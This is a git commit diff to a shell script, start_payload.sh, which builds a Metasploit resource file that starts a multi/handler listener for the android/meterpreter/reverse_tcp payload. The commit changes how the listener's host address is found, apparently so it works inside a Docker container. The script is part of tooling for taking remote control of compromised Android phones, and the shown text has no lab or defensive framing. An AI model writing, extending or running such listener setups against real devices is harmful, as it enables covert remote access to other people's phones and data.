9b0ca135623bef7133813df5e46d239984d6b681
“ChooseYourPlan” <timweweissenfels7@gmail.com>
2019-10-30 23:07:37 +0000

    Added Support for docker Container IP

--- start_payload.sh
+++ start_payload.sh
@@ -4,7 +4,7 @@ sudo bash -c "touch meterpreter.rc"
 sudo bash -c "echo use exploit/multi/handler >> meterpreter.rc"
 sudo bash -c "echo set PAYLOAD android/meterpreter/reverse_tcp >> meterpreter.rc"
 
-listen_host=$(cat config_payload.ini | grep Listen_Host | sed -E 's/(.*)={1}(.*)/\2/')
+listen_host=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
 listen_port=$(cat config_payload.ini | grep Listen_Port | sed -E 's/(.*)={1}(.*)/\2/')
 
 sudo bash -c "echo set LHOST $listen_host >> meterpreter.rc"
